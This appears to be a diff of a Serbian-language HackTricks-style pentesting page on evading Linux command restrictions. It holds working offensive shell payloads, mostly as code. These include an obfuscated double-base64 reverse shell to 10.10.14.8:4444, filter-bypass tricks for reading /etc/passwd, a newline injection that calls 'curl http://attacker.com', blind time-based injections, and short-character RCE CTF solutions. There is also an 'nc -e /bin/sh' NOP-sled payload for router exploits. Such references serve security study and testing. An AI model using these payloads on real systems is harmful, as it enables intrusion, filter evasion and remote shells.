@@ -1,12 +1,12 @@
 # Zaobilaženje Linux ograničenja
 
-{{#include ../../../banners/hacktricks-training.md}}
-
 ## Uobičajena zaobilaženja ograničenja
+
+Kolekcije command-injection i WAF-evasion primera u projektima PayloadsAllTheThings i Bo0oM's cheat sheet, kao i dva povezana članka na Secjuice-u, pružaju osnovu za varijacije shell sintakse u ovom odeljku.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
-# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
+# Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass putanja i zabranjenih reči
+### Putevi za zaobilaženje i zabranjene reči
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Bypass pomoću hex encoding-a
+### Zaobilaženje pomoću hex kodiranja
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -138,14 +138,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### DNS eksfiltracija podataka
 
-Na primer, možete koristiti **burpcollab** ili [**pingb**](http://pingb.in).
+Za out-of-band callbacks, servis nalik na Collaborator, kao što je Burp Collaborator, može navesti ciljnu aplikaciju da komunicira sa spoljnim serverom; postojeći link [**pingb**](http://pingb.in) zadržan je kao istorijska navigacija, a ne kao tvrdnja o trenutnoj dostupnosti.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-Ako ne možete da izvršavate eksterne funkcije i imate pristup samo **ograničenom skupu builtins za dobijanje RCE**, postoje neki korisni trikovi za to. Obično **nećete moći da koristite sve** **builtins**, zato bi trebalo da **znate sve svoje opcije** kako biste pokušali da zaobiđete jail. Ideja potiče od [**devploit**](https://twitter.com/devploit).\
-Pre svega proverite sve [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Zatim su ovde neke **preporuke**:
+U ograničenoj komandnoj liniji, dostupni builtins predstavljaju preostalu površinu komandi za ove primere; Bash dokumentuje svoje builtin komande i gramatiku izvršavanja.<sup>[[7]](#references)</sup> Ideja potiče od [**devploit**](https://twitter.com/devploit).\
+Počnite od postojeće navigacije [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), a zatim isprobajte sledeće Bash-specifične tehnike:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,20 +202,24 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Zaobilaženje potencijalnih regexa
+### Zaobilaženje potencijalnih regex izraza
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
+
+Sledeća naredba koristi Bashfuscator, open-source framework za obfuskaciju Bash-a; link ka repozitorijumu u komentaru koda zadržan je radi navigacije.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### RCE sa 5 karaktera
+### RCE sa 5 znakova
+
+Sledeća dva istorijska primera sa 5 znakova zadržana su kao reprodukcije izazova: primarno skladište izazova dostupno je na [repository-ju Orange Tsai-ja](https://github.com/orangetw/My-CTF-Web-Challenges), dok je drugi write-up link u bloku koda navigacija čija trenutna dostupnost nije proverena.<sup>[[9]](#references)</sup>
 ```bash
-# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
-#Oragnge Tsai solution
+# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
+#Orange Tsai solution
 ## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
 http://host/?cmd=>ls\
 http://host/?cmd=ls>_
@@ -259,7 +263,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE sa 4 znaka
+### RCE sa 4 karaktera
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -294,46 +298,52 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Read-Only/Noexec/Distroless Bypass
+## Zaobilaženje Read-Only/Noexec/Distroless ograničenja
 
-Ako se nalazite unutar filesystem-a sa **read-only i noexec zaštitama** ili čak u distroless container-u, i dalje postoje načini da **izvršite proizvoljne binarne fajlove, čak i shell!:**
+Ako se nalazite unutar filesystema sa **read-only i noexec zaštitama**, ili u **distroless image-u**, okruženje nameće ograničenja izvršavanja dokumentovana u Linux `mount(8)` i Distroless projektu; navedena stranica prikuplja tehnike za rad u okviru tih ograničenja.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Zaobilaženje Chroot-a i drugih Jail-ova
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Space-Based Bash NOP Sled ("Bashsledding")
+## Bash NOP Sled zasnovan na razmacima ("Bashsledding")
 
-Kada vam ranjivost omogućava delimičnu kontrolu argumenta koji na kraju dospeva do `system()` ili drugog shell-a, možda nećete znati tačan offset na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sled-ovi (npr. `\x90`) **ne funkcionišu u shell sintaksi**, ali Bash bezopasno ignoriše početni whitespace pre izvršavanja komande.
+Kada ranjivost omogućava delimičnu kontrolu argumenta koji na kraju stiže do `system()` ili druge ljuske, pomeraj payload-a može biti neizvestan. Alan Cao i Will Tan opisuju slučaj na ograničenom ugrađenom uređaju, gde je shell payload raspršen po memorijski mapiranom NVRAM-u i ispred njega su postavljeni razmaci.<sup>[[5]](#references)</sup>
 
-Zato možete napraviti *NOP sled za Bash* tako što ćete svoju stvarnu komandu prefiksovati dugim nizom razmaka ili tab karaktera:<sup>[[5]](#references)</sup>
+Zato možete napraviti *NOP sled za Bash* tako što ćete ispred stvarne komande postaviti dugačak niz razmaka ili tabulatora; Bash definiše razmake i tabulatore kao praznine koje razdvajaju reči u jednostavnoj komandi.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ako ROP chain (ili bilo koji memory-corruption primitive) postavi instruction pointer bilo gde unutar bloka razmaka, Bash parser jednostavno preskače razmak dok ne dođe do `nc`, pouzdano izvršavajući vašu komandu.
+Ako ROP lanac (ili drugi primitiv za korupciju memorije) prosledi pokazivač na command-string koji počinje bilo gde unutar bloka razmaka, Bash može da obradi preostale početne razmake dok ne naiđe na komandu; u navedenom router exploit-u, ovo je omogućilo korišćenje nepouzdanih string offset-a.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Praktični slučajevi upotrebe:
+Praktični slučajevi upotrebe na ograničenim embedded metama uključuju:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (npr. NVRAM) kojima se može pristupiti iz više procesa.
-2. Situacije u kojima attacker ne može da upisuje NULL bajtove radi poravnanja payload-a.
-3. Embedded uređaji na kojima je dostupan samo BusyBox `ash`/`sh` – oni takođe ignorišu vodeće razmake.
+1. **Blob-ove konfiguracije mapirane u memoriju** (npr. NVRAM) kojima se može pristupiti iz više procesa.<sup>[[5]](#references)</sup>
+2. Kanale za payload u kojima napadač ne može da upisuje NULL bajtove radi poravnanja payload-a (opšta adaptacija problema poravnanja).<sup>[[5]](#references)</sup>
+3. Embedded uređaje sa malim BusyBox `ash`/`sh` okruženjem, koje BusyBox dokumentuje kao applets u sistemima sa ograničenim resursima.<sup>[[10]](#references)</sup>
 
-> 🛠️  Kombinujte ovaj trik sa ROP gadgets koji pozivaju `system()` da biste značajno povećali pouzdanost exploit-a na IoT ruterima sa ograničenom memorijom.
+> 🛠️  Kombinujte ovu tehniku sa ROP gadgets koji pozivaju `system()` u kontrolisanoj laboratoriji; navedeno istraživanje router-a demonstrira ovu kombinaciju na hardveru sa ograničenim resursima.<sup>[[5]](#references)</sup>
 
-## Reference
+## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-
+- [2] [Bo0oM - Cheat Sheet za zaobilaženje WAF-a](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Tehnike za izbegavanje Web Application Firewall-a (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Tehnike za izbegavanje Web Application Firewall-a (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao i Will Tan — Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
+- [7] [bash(1) — Linux priručnik](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
+- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
+- [11] [mount(8) — Linux priručnik](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
